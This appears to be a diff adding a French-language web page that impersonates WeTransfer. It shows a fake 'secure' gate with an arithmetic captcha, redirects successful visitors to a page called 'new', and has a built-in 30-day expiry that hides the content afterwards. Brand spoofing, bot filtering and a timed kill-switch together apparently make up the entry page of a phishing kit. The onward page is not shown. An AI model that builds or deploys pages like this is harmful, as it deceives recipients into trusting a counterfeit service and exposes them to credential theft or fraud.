@@ -1,0 +1,241 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>WeTransfer - Sécurisé</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f4f6;
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 80px 20px;
+    }
+
+    .logo img {
+      height: 40px;
+    }
+
+    .box {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      position: relative;
+    }
+
+    .file-name {
+      font-weight: bold;
+      margin: 10px 0;
+    }
+
+    .description {
+      font-size: 0.95rem;
+      color: #333;
+      margin-bottom: 1rem;
+    }
+
+    .captcha-container {
+      margin: 20px 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .captcha-label {
+      margin-bottom: 10px;
+    }
+
+    .captcha-input {
+      padding: 10px;
+      width: 100px;
+      text-align: center;
+      font-size: 1rem;
+    }
+
+    .submit-btn {
+      background-color: #ff6600;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-size: 1rem;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    #error-message {
+      color: red;
+      margin-bottom: 10px;
+      display: none;
+    }
+
+    #loading {
+      display: none;
+      margin-top: 10px;
+      font-size: 0.9rem;
+      color: #555;
+    }
+
+    .footer {
+      margin-top: 60px;
+      font-size: 0.8rem;
+      color: #777;
+    }
+
+    @media (max-width: 480px) {
+      .box {
+        padding: 1.5rem;
+      }
+
+      .logo img {
+        height: 30px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <h2>WeTransfer</h2>
+    </div>
+
+    <div class="box">
+      <h3></h3>
+      <div class="file-name"></div>
+      <p class="description">
+        Veuillez confirmer que vous êtes un humain en résolvant le calcul suivant :
+      </p>
+
+      <div id="error-message"></div>
+      <div id="loading">Redirection en cours...</div>
+
+      <form onsubmit="return onSubmit(event)" autocomplete="off">
+        <div class="captcha-container">
+          <label class="captcha-label" for="captcha-answer" id="captcha-question">Calcul...</label>
+          <input type="number" id="captcha-answer" class="captcha-input" placeholder="Réponse" required aria-describedby="captcha-question" />
+        </div>
+        <button type="submit" class="submit-btn">Continuer</button>
+      </form>
+    </div>
+
+    <div class="footer">© WeTransfer 2025</div>
+  </div>
+
+ 
+<script>
+let expectedAnswer;
+
+// Génère une addition simple
+function generateCaptcha() {
+  const num1 = Math.floor(Math.random() * 10) + 1;
+  const num2 = Math.floor(Math.random() * 10) + 1;
+  expectedAnswer = num1 + num2;
+  const label = document.getElementById('captcha-question');
+  label.textContent = `Combien font ${num1} + ${num2} ?`;
+}
+
+// Vérifie la réponse
+function onSubmit(e) {
+  e.preventDefault();
+  const input = document.getElementById('captcha-answer');
+  const userAnswer = parseInt(input.value.trim(), 10);
+  const error = document.getElementById('error-message');
+  const loading = document.getElementById('loading');
+
+  if (userAnswer === expectedAnswer) {
+    error.style.display = "none";
+    loading.style.display = "block";
+
+    // Simule un délai de chargement
+    setTimeout(() => {
+      localStorage.setItem('valide', 'true');
+      window.location.href = "new";
+    }, 1000);
+  } else {
+    error.textContent = "Réponse incorrecte. Veuillez réessayer.";
+    error.style.display = "block";
+    generateCaptcha();
+    input.value = "";
+  }
+}
+
+// Vérifie si le lien a expiré
+function isLinkExpired() {
+  const startDate = new Date('2025-06-08T00:00:00');
+  const expirationDays = 30;
+  const now = new Date();
+  const timeDiff = now - startDate;
+  const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
+  return daysPassed >= expirationDays;
+}
+
+// Affiche un message d’expiration avec style percutant
+function showExpirationMessage() {
+  document.body.innerHTML = '';
+
+  const messageDiv = document.createElement('div');
+  messageDiv.innerHTML = `
+    <h1>⚠️ Le lien a expiré</h1>
+    <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
+  `;
+
+  Object.assign(messageDiv.style, {
+    position: 'fixed',
+    top: '0',
+    left: '0',
+    width: '100vw',
+    height: '100vh',
+    display: 'flex',
+    flexDirection: 'column',
+    justifyContent: 'center',
+    alignItems: 'center',
+    backgroundColor: '#1a1a1a',
+    color: '#ff4d4f',
+    fontFamily: 'Segoe UI, Arial, sans-serif',
+    fontSize: '24px',
+    textAlign: 'center',
+    padding: '40px',
+    boxSizing: 'border-box',
+    zIndex: '9999',
+  });
+
+  messageDiv.querySelector('h1').style.fontSize = '36px';
+  messageDiv.querySelector('h1').style.marginBottom = '20px';
+  messageDiv.querySelector('p').style.color = '#ffffff';
+
+  document.body.appendChild(messageDiv);
+}
+
+// Combiner tout au chargement
+window.onload = function () {
+  if (isLinkExpired()) {
+    showExpirationMessage();
+  } else {
+    generateCaptcha();
+  }
+};
+</script>
+
+
+</body>
+</html>
